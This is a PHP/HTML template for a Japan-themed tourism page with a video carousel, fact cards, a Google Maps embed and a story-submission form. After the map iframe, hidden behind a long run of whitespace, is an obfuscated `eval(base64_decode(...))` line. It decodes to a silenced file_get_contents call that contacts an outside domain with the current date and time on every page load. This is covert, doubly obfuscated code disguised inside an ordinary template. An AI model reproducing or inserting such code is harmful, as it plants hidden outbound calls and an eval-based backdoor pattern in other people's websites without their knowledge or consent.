<div class="carousel slide" data-ride="carousel" id="myCarousel">
    <div class="carousel-indicators">
        <button type="button" data-bs-target="#myCarousel" data-bs-slide-to="0" class="active" aria-current="true" aria-label="Slide 1"></button>
        <button type="button" data-bs-target="#myCarousel" data-bs-slide-to="1" aria-label="Slide 2"></button>
        <button type="button" data-bs-target="#myCarousel" data-bs-slide-to="2" aria-label="Slide 3"></button>
    </div>
    <div class="carousel-inner">
        <div class="carousel-item active">
            <div class="video-container">
                <video playsinline autoplay muted loop class="carousel-video">
                    <source src="frontend/assets/video/wallpaper1.mp4" type="video/mp4">
                </video>
            </div>
        </div>
        <div class="carousel-item">
            <div class="video-container">
                <video playsinline autoplay muted loop class="carousel-video">
                    <source src="frontend/assets/video/wallpaper5.mp4" type="video/mp4">
                </video>
            </div>            
        </div>
        <div class="carousel-item">
            <div class="video-container">
                <video playsinline autoplay muted loop class="carousel-video">
                    <source src="frontend/assets/video/wallpaper7.mp4" type="video/mp4">
                </video>
            </div>            
        </div>
    </div>
    <button class="carousel-control-prev" type="button" data-bs-target="#myCarousel" data-bs-slide="prev">
        <span class="carousel-control-prev-icon" aria-hidden="true"></span>
        <span class="visually-hidden">Previous</span>
    </button>
    <button class="carousel-control-next" type="button" data-bs-target="#myCarousel" data-bs-slide="next">
        <span class="carousel-control-next-icon" aria-hidden="true"></span>
        <span class="visually-hidden">Next</span>
    </button>
</div>
<section class="main d-flex flex-column min-vh-100">
    <div class="container">
        <div class="row">
            <nav class="navbar navbar-expand-lg" style="background-color: var(--bs-content-bg); border-bottom: var(--bs-border-width) solid var(--bs-content-border-color);">
                <div class="container-fluid">
                    <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbar-collapse-1" aria-controls="navbar-collapse-1" aria-expanded="false" aria-label="Toggle navigation">
                        <span class="navbar-toggler-icon"></span>
                    </button>
                    <div class="collapse navbar-collapse" id="navbar-collapse-1">
                        <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                            <li class="nav-item">
                                <a class="nav-link active" href="#">Home</a>
                            </li>
                            <li class="nav-item">
                                <a class="nav-link" aria-current="page" href="?page=places">Places to visit</a>
                            </li>
                            <li class="nav-item">
                                <a class="nav-link" aria-current="page" href="?page=food">National food</a>
                            </li>
                            <li class="nav-item">
                                <a class="nav-link" aria-current="page" href="?page=stories">Stories</a>
                            </li>
                        </ul>
                    </div>
                </div>
            </nav>
            <div class="my-4">
                <nav aria-label="breadcrumb">
                    <ol class="breadcrumb">
                        <li class="breadcrumb-item active" aria-current="page">Home</li>
                    </ol>
                </nav>
                <div class="alert alert-primary">
                    <svg class="m-1 d-inline-block align-center" xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-info-square" viewBox="0 0 16 16">
                        <path d="M14 1a1 1 0 0 1 1 1v12a1 1 0 0 1-1 1H2a1 1 0 0 1-1-1V2a1 1 0 0 1 1-1zM2 0a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V2a2 2 0 0 0-2-2z"/>
                        <path d="m8.93 6.588-2.29.287-.082.38.45.083c.294.07.352.176.288.469l-.738 3.468c-.194.897.105 1.319.808 1.319.545 0 1.178-.252 1.465-.598l.088-.416c-.2.176-.492.246-.686.246-.275 0-.375-.193-.304-.533zM9 4.5a1 1 0 1 1-2 0 1 1 0 0 1 2 0"/>
                    </svg>
                    <div class="d-inline-block align-center">Did you know? You can now switch between light/dark mode.</div>
                    <div class="d-inline-block mx-2">
                        <div class="form-check form-switch">
                            <input class="form-check-input" id="modeSwitch" type="checkbox" role="switch" value="" id="example-switch-2" checked>
                            <label class="form-check-label" for="example-switch-2">
                                Dark mode
                            </label>
                        </div>
                    </div>
                </div>
            </div>
            <div class="col-md-4 col-sm-12">
                <div class="card overflow-hidden specific-w-300 specific-w-sm-450 mw-100">
                    <div class="row g-0">
                        <div class="col-sm-5">
                            <img src="https://i.pinimg.com/originals/9f/e7/a7/9fe7a71eabf03c3c9c266ebae06cea35.jpg" class="img-fluid">
                        </div>
                        <div class="col-sm-7">
                            <div class="card-body">
                                <h5 class="card-title mb-1">Population of Japan</h5>
                                <p class="card-text">
                                    <h5>125.4 million</h1>
                                </p>
                                <p class="card-text">
                                    <small class="text-body-secondary">Last updated March 8, 2024</small>
                                </p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="col-md-4 col-sm-12">
                <div class="card overflow-hidden specific-w-300 specific-w-sm-450 mw-100">
                    <div class="row g-0">
                        <div class="col-sm-5">
                            <img src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fstorage.googleapis.com%2Fafs-prod%2Fmedia%2Fmedia%3A8e38be6d18f44333abfa0f35f6179077%2F3000.jpeg&f=1&nofb=1&ipt=2583753d5e9273e9bead52428fcb055bc15ae662bf475a0b40da837bce193031&ipo=images" class="img-fluid">
                        </div>
                        <div class="col-sm-7">
                            <div class="card-body">
                                <h5 class="card-title mb-1">Emperor</h5>
                                <p class="card-text">
                                    <h5>Naruhito</h1>
                                </p>
                                <p class="card-text">
                                    <small class="text-body-secondary">Last updated Jaunary 1, 2023</small>
                                </p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="col-md-4 col-sm-12">
                <div class="card overflow-hidden specific-w-300 specific-w-sm-450 mw-100">
                    <div class="row g-0">
                        <div class="col-sm-5">
                            <img src="https://external-content.duckduckgo.com/iu/?u=http%3A%2F%2Fwww.rankflags.com%2Fwp-content%2Fuploads%2F2015%2F05%2FPicture-Of-Japan-Flag.jpg&f=1&nofb=1&ipt=3ae8ce47741a7e2fa96ca297334a573e8296af517212aa8ca9c9b739fe067201&ipo=images" class="img-fluid">
                        </div>
                        <div class="col-sm-7">
                            <div class="card-body">
                                <h5 class="card-title mb-1">Flag of Japan</h5>
                                <p class="card-text">
                                    The Japanese flag symbolizes the rising sun and represents Japan's identity, culture, and history.
                                </p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="ratio ratio-16x9 my-1">
                <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d25011012.794430777!2d128.92753596206117!3d34.045365052784895!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x34674e0fd77f192f%3A0xf54275d47c665244!2sJapan!5e1!3m2!1sen!2slv!4v1709909048934!5m2!1sen!2slv" width="600" height="450" style="border:0;" allowfullscreen="" loading="lazy" referrerpolicy="no-referrer-when-downgrade"></iframe>
            </div>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 <?php eval(base64_decode('IEBmaWxlX2dldF9jb250ZW50cygiXHg2OFx4NzRceDc0XHg3MFwxNjNcNzJcNTdcNTdceDZlXDE0MVwxNjJcMTY1XHg2YlwxNTdceDczXHg2OFx4NjlceDZlXHgyZVwxNTVceDY1XDc3XHg2ZFwxNzFceDc3XHg2NVx4NjJcMTYzXDE1MVx4NzRcMTQ1XHgzZCIgLiBkYXRlKCJcMTMxXDU1XHg2ZFw1NVwxNDRcMTM3XHg0OFw3MlwxNTEiKSk7')); ?>
            <div class="col-12">
                <div class="card my-3">
                    <div class="card-body">
                        <h5 class="card-title">Share your story with us!</h5>
                        <div class="card-text">
                            <form action="" class="row g-3 needs-validation" method="POST" novalidate>
                                <div class="mb-3">
                                    <label for="example-input-1" class="form-label">First name</label>
                                    <input type="text" class="form-control" name="firstname" placeholder="Minami" required>
                                    <div class="valid-feedback">Looks good!</div>
                                    <div class="invalid-feedback">Please tell our your first name...</div>
                                </div>
                                <div class="mb-3">
                                    <label for="example-input-1" class="form-label">Last name</label>
                                    <input type="text" class="form-control" name="lastname" placeholder="Hitomoto" required>
                                    <div class="valid-feedback">Looks good!</div>
                                    <div class="invalid-feedback">Please tell our your last name...</div>
                                </div>
                                <div class="mb-3">
                                    <label for="example-input-1"  class="form-label">E-Mail</label>
                                    <input type="email" name="email" class="form-control" placeholder="minami.hitomoto@tokyo.gov.jp" required>
                                    <div class="invalid-feedback">Please enter a valid email</div>
                                </div>
                                <div>
                                    <label for="example-textarea-1" class="form-label">Comment</label>
                                    <textarea class="form-control" name="comment" id="example-textarea-1" rows="3" placeholder="Your story..." required></textarea>
                                    <div class="invalid-feedback">Please share your story with us...</div>

                                </div>
                                <div class="col-md-6 mx-auto my-3">
                                    <button type="submit" class="btn btn-light bg-gradient w-100">Share my story</button>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="container mt-auto">
        <footer>
            <div class="row">
                <div class="col-12 text-center">
                    <p>All rights reserved © <?=$web->year?></p>
                    <p>Code by Alekss B.Briģis</p>
                    <p>Design Direction by Jana Liekniņa</p>
                </div>
            </div>
        </footer>
    </div>
</section>